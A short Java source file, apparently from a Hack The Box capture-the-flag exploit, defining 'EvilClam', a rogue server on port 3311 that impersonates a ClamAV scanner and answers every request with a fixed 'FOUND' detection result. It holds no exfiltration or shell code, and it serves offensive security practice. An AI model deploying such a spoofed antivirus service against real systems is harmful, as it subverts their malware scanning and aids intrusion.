package com.htb.hosting.rmi.myclam;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

public class EvilClam {
    private static final int PORT = 3311;
    private static final String FAILED_RESPONSE = "path: ClamAV-Test-File FOUND\n";

    public void start(){
        try {
            ServerSocket serverSocket = new ServerSocket(PORT);
            System.out.println("Server started on port " + PORT);

            while (true) {
                Socket socket = serverSocket.accept();
                new Thread(() -> handleConnection(socket)).start();
            }
        } catch (Exception e) {
            System.err.println("Server exception: " + e);
            e.printStackTrace();
        }
    }

    private void handleConnection(Socket socket) {
        try {
            DataInputStream dis = new DataInputStream(socket.getInputStream());
            DataOutputStream dos = new DataOutputStream(socket.getOutputStream());

            byte[] buffer = new byte[1024*4];
            int read = dis.read(buffer);
            String request = new String(buffer, 0, read);
            System.out.println("Received request: " + request);

            dos.writeBytes(FAILED_RESPONSE);
            dos.flush();
            System.out.println("Sent response: " + FAILED_RESPONSE);

//            socket.close();
        } catch (IOException e) {
            System.err.println("Connection exception: " + e);
            e.printStackTrace();
        }
    }
}
